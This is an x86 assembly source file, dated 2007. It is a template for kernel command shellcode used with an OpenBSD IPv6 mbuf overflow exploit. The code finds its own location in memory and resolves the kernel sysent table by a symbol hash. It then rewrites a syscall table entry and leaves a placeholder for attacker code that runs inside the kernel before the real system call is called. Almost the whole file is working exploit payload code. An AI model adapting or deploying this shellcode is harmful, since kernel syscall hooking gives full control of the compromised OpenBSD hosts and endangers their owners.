 #
 # Template for kernel command shellcode (OpenBSD IPv6 mbuf overflow).
 #
 #  Copyright (c) 2007 Claes M. Nyberg <cmn@signedness.org>
 #  All rights reserved, all wrongs reversed.
 #
 #  Redistribution and use in source and binary forms, with or without
 #  modification, are permitted provided that the following conditions
 #  are met:
 #
 #  1. Redistributions of source code must retain the above copyright
 #     notice, this list of conditions and the following disclaimer.
 #  2. Redistributions in binary form must reproduce the above copyright
 #     notice, this list of conditions and the following disclaimer in the
 #     documentation and/or other materials provided with the distribution.
 #  3. The name of author may not be used to endorse or promote products
 #     derived from this software without specific prior written permission.
 #
 #  THIS SOFTWARE IS PROVIDED ``AS IS'' AND ANY EXPRESS OR IMPLIED WARRANTIES,
 #  INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY
 #  AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL
 #  THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 #  EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,
 #  PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS;
 #  OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY,
 #  WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR
 #  OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF
 #  ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 #
 #

# Hash of symbols to resolve
.set HASH_sysent, 0xedcb2234

# Resolve syscall address from table
.macro get_syscall idx, reg
    movl   -8(%ebp), %ecx
    movl   \idx, \reg # Index
    movl   4(%ecx, \reg, 8), \reg
.endm

# Set syscall address in table
.macro set_syscall idx, addr
    movl   -8(%ebp), %ecx
    movl   \idx, %eax # Index
    movl   \addr, 4(%ecx, %eax, 8)
.endm

.global template_start
.global template_end

#
# Start of command.
# The buffer we run in is prepended with
# 1) The address to the hash_resolve routine
# 2) The address of the real system call
# 3) The index of the system call
#
.text
template_start:
	# Get our location
	call get_template_start_location
	nop
	get_template_start_location:

	# Point to start of code
	# to extract syscall information
	popl	%ecx
	subl	$5, %ecx

    pushl   %ebp
    movl    %esp, %ebp

	# hash_resolve -4(%ebp)
	pushl	-12(%ecx)

	# sysent -8(%ebp)
	pushl	$HASH_sysent
	call	*-4(%ebp)
	movl	%eax, -8(%ebp)

	# Address of real syscall -12(%ebp)
	pushl	-4(%ecx)

	# Recover syscall
	movl	-4(%ecx), %edx # syscall address
	movl	-8(%ecx), %eax # Index
	set_syscall %eax, %edx

	#---------------------
	# Do stuff here
	#---------------------

	# Call real syscall
	call_real_syscall:
		pushl	16(%ebp)	# retval
		pushl	12(%ebp)	# arg
		pushl	8(%ebp)		# curproc
		call	*-12(%ebp)

	# Return value from real syscall
	syscall_finished:
		movl    %ebp, %esp
		popl    %ebp
		ret

template_end:
